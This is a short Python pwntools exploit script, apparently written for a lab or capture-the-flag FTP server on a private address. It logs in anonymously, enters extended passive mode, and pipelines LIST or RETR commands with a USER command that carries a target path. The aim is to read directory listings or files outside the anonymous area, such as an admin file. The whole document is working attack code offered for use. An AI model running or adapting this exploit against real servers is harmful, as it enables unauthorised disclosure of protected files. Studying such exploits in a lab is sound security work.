from pwn import *

ip = "192.168.2.37"
port = "21"
con1 = remote(ip, port)
print(con1.recv())

def getPassivePort(response):
	if b'Entering Extended Passive Mode' in response:
		parts = response.split(b'|')
		passive_port = int(parts[3])
		return passive_port
	else:
	     return -1
	

def listDir(path=b'/'):
	path = bytes(path, 'utf-8')
	con1.send(b'LIST /\r\n')
	con1.send(b'USER ' + path + b'\r\n')
	
def modifyBuffer(anon_file_path, target_file_path):
	anon_file_path = bytes(anon_file_path, 'utf-8')
	target_file_path = bytes(target_file_path, 'utf-8')
	
	con1.send(b'RETR ' + anon_file_path + b'\r\n') # putting valid path 
	con1.send(b'USER ' + target_file_path + b'\r\n') 



# logging in as anonymous
con1.send(b'USER anonymous\r\n')
print(con1.recv())
con1.send(b'PASS fghfdgass\r\n')
print(con1.recv())

# connecting on pasive mode
con1.send(b'EPSV\r\n')
response = con1.recv()
print(response)

passive_port = getPassivePort(response)
print("Got Passive port : %s" % passive_port)


listDir('/')
# or
#modifyBuffer('/hi.txt', '/home/artful/server/files/admin/admin.txt') 



# main exploit
con2 = remote(ip , passive_port)
print(con1.recv())
time.sleep(0.1)

b_received_content = con2.recv()
#print(b_received_content)
output_string = b_received_content.decode("utf-8").replace("\r\n", "\n")

# Print the resulting string
print('---------------------------\nReceived contents:\n')
print(output_string)
print('---------------------------')
